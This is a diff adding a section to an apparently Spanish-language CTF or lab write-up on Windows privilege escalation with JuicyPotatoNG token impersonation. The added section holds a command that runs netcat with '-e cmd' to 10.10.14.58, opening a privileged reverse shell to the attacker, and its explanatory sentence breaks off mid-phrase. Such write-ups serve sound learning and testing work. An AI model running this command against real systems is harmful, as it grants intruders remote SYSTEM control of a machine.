@@ -253,3 +253,9 @@ subimos la herramienta a la maquina victima
 `JuicyPotatoNG.exe es una herramienta utilizada que aprovecha una característica del sistema conocida como "Token Impersonation" para escalar privilegios.`
 ![[Pasted image 20240402005618.png]]
 
+### Impersonate
+```python
+.\JuicyPotatoNG.exe -t * -p C:\Windows\System32\cmd.exe -a "/c C:\Temp\netcat.exe -e cmd 10.10.14.58 7890"
+```
+con este comando vamos a decirle a la
+![[Pasted image 20240402010411.png]]
